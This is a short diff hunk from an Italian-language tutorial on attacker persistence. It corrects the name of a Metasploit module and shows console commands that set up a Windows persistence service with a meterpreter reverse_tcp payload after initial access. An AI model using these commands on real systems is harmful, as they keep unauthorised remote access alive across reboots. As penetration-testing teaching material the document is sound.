@@ -4,7 +4,7 @@ La persistenza consiste in una serie di tecniche che degli aggressori utilizzano
 ## modulo persistance service
 dopo aver ottenuto l'accesso a un target tramite una sessione meterpreter, possiamo usare un modulo per poter mantenere l'accesso sul sistema anche quando viene riavviato.
 ```bash
-use exploit/windows/local/persistance_service
+use exploit/windows/local/persistence_service
 set payload windows/meterpreter/reverse_tcp
 set REMOTE_EXE_NAME <nome>                         # impostiamo un nome al sitema target su cui vogliamo mantenere l'accesso
 set REMOTE_EXE_PATH                                # impostiamo il path dove si dovrá trovare il nostro servizio di persistenza
